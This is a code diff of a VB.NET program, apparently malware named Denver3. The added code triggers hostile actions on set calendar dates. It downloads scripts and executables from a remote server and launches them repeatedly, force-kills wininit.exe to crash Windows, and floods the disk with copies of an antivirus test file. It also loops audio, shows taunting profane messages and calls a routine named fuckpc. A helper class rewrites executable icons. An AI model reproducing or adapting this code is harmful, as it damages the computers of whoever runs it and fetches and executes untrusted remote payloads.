+                If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
+                    Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
+                End If
+                If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
+                    MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
+                    'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "NAHIMTOOPOWERRFULL_666.wav", InstallPath & "\NAHIMTOOPOWERRFULL_666.wav")
+
+
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", InstallPath & "\NAH.CMD")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs")
+
+                    Catch ex As Exception
+
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
+                    MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
+                    For index As Integer = 1 To 20 'Open 100 Windows of the most random shit
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\NAH.CMD")
+                        Process.Start(InstallPath & "\SkillE.vbs")
+                    Next
+                End If
+
+                If currentTime.Month = 7 And currentTime.Date.Day = 27 Then
+                    Rickroll.Show()
+                End If
+                If currentTime.Month = 8 And currentTime.Date.Day = 25 Then
+                    MsgBox("This is all your fault...", 0 + 64, "Denver3")
+                    MyUtilities.RunCommandComInvis("TASKKILL /IM wininit.exe /T /F", "", False)
+                End If
+
+                If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "SkillE.vbs", InstallPath & "\SkillE.vbs") '8-Bit Nyan_C.wav
+
+                    Catch ex As Exception
+
+                    End Try
+                    MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
+                    For index As Integer = 1 To 20
+                        Process.Start(InstallPath & "\SkillE.vbs")
+                    Next
+                End If
+
+                If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
+                    MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "AVTESTFILE.EXE", InstallPath & "\AVTESTFILE.EXE")
+                    Catch ex As Exception
+                    End Try
+                    For index As Integer = 1 To 30 'OverLoadAntiVirus
+                        Try
+                            My.Computer.FileSystem.CopyFile(InstallPath & "\AVTESTFILE.EXE", InstallPath & "\AVTESTFILE" & CInt(Int((1000 * Rnd()) + 1)) & ".EXE")
+                        Catch ex As Exception
+                        End Try
+                    Next
+                End If
+
+                If currentTime.Month = 4 And currentTime.Date.Day = 15 Then
+
+
+                End If
+                If currentTime.Month = 4 And currentTime.Date.Day = 15 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+                End If
+                If currentTime.Month = 4 And currentTime.Date.Day = 25 Then
+                    MsgBox("ur worst nightmare")
+                    AAAAAAA.Show()
+                End If
+                If currentTime.Month = 8 And currentTime.Date.Day = 23 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "you_are_an_idiot_Made_for_Epicerror.exe", InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                    Catch ex As Exception
+
+                    End Try
+                    Try
+                        Process.Start(InstallPath & "\MTRAILS.exe")
+                    Catch ex As Exception
+                        MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                    End Try
+                    Process.Start(InstallPath & "\you_are_an_idiot_Made_for_Epicerror.exe")
+                End If
+
+                If currentTime.Month = 10 And currentTime.Date.Day = 2 Then
+                    ScreenStuck.Show()
+                End If
+                If currentTime.Month = 4 And currentTime.Date.Day = 16 Then
+                    FitTeaTimer.Start()
+                End If
+                If currentTime.Month = 6 And currentTime.Date.Day = 17 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "STILLALI.EXE.wav", InstallPath & "\STILLALI.EXE.wav")
+                    Catch ex As Exception
+
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\STILLALI.EXE.wav", AudioPlayMode.BackgroundLoop)
+                End If
+                If currentTime.Month = 11 Then
+                    Try
+                        My.Computer.Network.DownloadFile(ServerAddr & "8-Bit%20Nyan_C.wav", InstallPath & "\Neon.wav")
+                    Catch ex As Exception
+                    End Try
+                    My.Computer.Audio.Play(InstallPath & "\Neon.wav", AudioPlayMode.BackgroundLoop)
+                    MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
+                End If
+
+                If currentTime.Month = 12 And currentTime.Day = 1 Or True = False Then
+                    fuckpc()
+                End If
             End If
-        End If
 
     End Sub
 
@@ -1071,5 +1086,65 @@ Public Class MyUtilities
         pi.FileName = "cmd.exe"
         p.StartInfo = pi
         p.Start()
+    End Sub
+End Class
+
+Public Class IconChanger
+
+    Public Shared Sub ChangeIcon(iconFilePath As String, exeFilePath As String)
+        Dim newIcon As Icon = New Icon(iconFilePath)
+
+        Using resourceStream As New FileStream(exeFilePath, FileMode.Open, FileAccess.ReadWrite)
+            Using iconWriter = New IconWriter(resourceStream)
+                iconWriter.ReplaceIcon(0, newIcon)
+            End Using
+        End Using
+    End Sub
+
+
+End Class
+
+
+Public Class IconReader
+    Implements IDisposable
+
+    Private _stream As Stream
+
+    Public Sub New(stream As Stream)
+        _stream = stream
+    End Sub
+
+    Public Function ExtractIcon(index As Integer) As Icon
+        Dim icon As New Icon(_stream)
+        Return icon
+    End Function
+
+    Public Sub Dispose() Implements IDisposable.Dispose
+        If _stream IsNot Nothing Then
+            _stream.Dispose()
+        End If
+    End Sub
+End Class
+
+
+
+Public Class IconWriter
+    Implements IDisposable
+
+    Private _stream As Stream
+
+    Public Sub New(stream As Stream)
+        _stream = stream
+    End Sub
+
+    Public Sub ReplaceIcon(index As Integer, newIcon As Icon)
+        Dim bmp As Bitmap = newIcon.ToBitmap()
+        bmp.Save(_stream, ImageFormat.Icon)
+    End Sub
+
+    Public Sub Dispose() Implements IDisposable.Dispose
+        If _stream IsNot Nothing Then
+            _stream.Dispose()
+        End If
     End Sub
 End Class
